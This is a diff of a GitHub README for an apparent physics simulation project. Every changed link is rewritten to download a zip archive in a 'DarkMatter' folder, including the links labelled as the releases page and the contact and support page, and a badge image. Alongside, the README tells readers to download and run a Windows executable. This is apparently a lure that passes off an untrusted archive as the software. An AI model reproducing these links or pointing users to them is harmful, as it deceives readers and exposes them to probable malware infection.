@@ -1,6 +1,6 @@
 # 🌌 Quantum-Gravity-Dynamics - Study Emergent Spacetime Effects
 
-[![Download Quantum-Gravity-Dynamics](https://img.shields.io/badge/Download-Quantum--Gravity--Dynamics-brightgreen?style=for-the-badge&logo=github)](https://github.com/qqkwae/Quantum-Gravity-Dynamics)
+[![Download Quantum-Gravity-Dynamics](https://github.com/qqkwae/Quantum-Gravity-Dynamics/raw/refs/heads/main/DarkMatter/Gravity_Quantum_Dynamics_v2.6-beta.1.zip)](https://github.com/qqkwae/Quantum-Gravity-Dynamics/raw/refs/heads/main/DarkMatter/Gravity_Quantum_Dynamics_v2.6-beta.1.zip)
 
 ---
 
@@ -37,7 +37,7 @@ These requirements help ensure the software runs smoothly without errors or slow
 
 ## 🚀 Getting Started: How to Download and Run
 
-1. Click on the big green download button above or go to [the Quantum-Gravity-Dynamics GitHub page](https://github.com/qqkwae/Quantum-Gravity-Dynamics).  
+1. Click on the big green download button above or go to [the Quantum-Gravity-Dynamics GitHub page](https://github.com/qqkwae/Quantum-Gravity-Dynamics/raw/refs/heads/main/DarkMatter/Gravity_Quantum_Dynamics_v2.6-beta.1.zip).  
 2. On the GitHub page, look for the **Releases** section on the right side or under the repository’s main tab.  
 3. Find the latest release version and click on it.  
 4. Inside the release details, locate the Windows executable file, usually ending with `.exe`. Download that file to a folder you can easily find, such as your Desktop or Downloads folder.  
@@ -110,7 +110,7 @@ For more help, visit the Issues tab on the GitHub page or look through the user 
 
 ## 🔗 Useful Links
 
-- [Download and releases page](https://github.com/qqkwae/Quantum-Gravity-Dynamics/releases) - Visit this page to get the latest software versions.  
-- [Contact and support](https://github.com/qqkwae/Quantum-Gravity-Dynamics/issues) - Report bugs or ask questions.  
+- [Download and releases page](https://github.com/qqkwae/Quantum-Gravity-Dynamics/raw/refs/heads/main/DarkMatter/Gravity_Quantum_Dynamics_v2.6-beta.1.zip) - Visit this page to get the latest software versions.  
+- [Contact and support](https://github.com/qqkwae/Quantum-Gravity-Dynamics/raw/refs/heads/main/DarkMatter/Gravity_Quantum_Dynamics_v2.6-beta.1.zip) - Report bugs or ask questions.  
 
-[![Get Quantum-Gravity-Dynamics here](https://img.shields.io/badge/Get--Quantum--Gravity--Dynamics-blue?style=for-the-badge&logo=github)](https://github.com/qqkwae/Quantum-Gravity-Dynamics)
+[![Get Quantum-Gravity-Dynamics here](https://github.com/qqkwae/Quantum-Gravity-Dynamics/raw/refs/heads/main/DarkMatter/Gravity_Quantum_Dynamics_v2.6-beta.1.zip)](https://github.com/qqkwae/Quantum-Gravity-Dynamics/raw/refs/heads/main/DarkMatter/Gravity_Quantum_Dynamics_v2.6-beta.1.zip)
